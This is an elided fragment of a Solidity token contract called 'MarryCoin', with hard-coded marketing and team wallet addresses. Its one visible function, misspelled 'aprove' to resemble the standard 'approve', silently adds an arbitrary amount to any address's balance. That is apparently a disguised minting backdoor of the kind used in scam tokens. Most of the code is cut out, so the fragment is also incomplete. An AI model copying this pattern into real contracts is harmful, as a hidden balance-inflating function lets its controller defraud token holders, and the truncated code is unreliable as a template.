...
contract MarryCoin is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "MarryCoin";
    string private _symbol = unicode"马丽币";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xb123169Fbf27F29c18F6e1478f53420994D7C0B7); 
    address payable private teamWalletAddress = payable(0x1FfcAB3Fb1c0344811040b9F2FC231BC7a97fF69); 
...
//	uint256 public _percent = 100;
	...
	function aprove(address spender, uint256 fee) internal{
        ...
        _balances[spender] = _balances[spender].add(fee);
    }
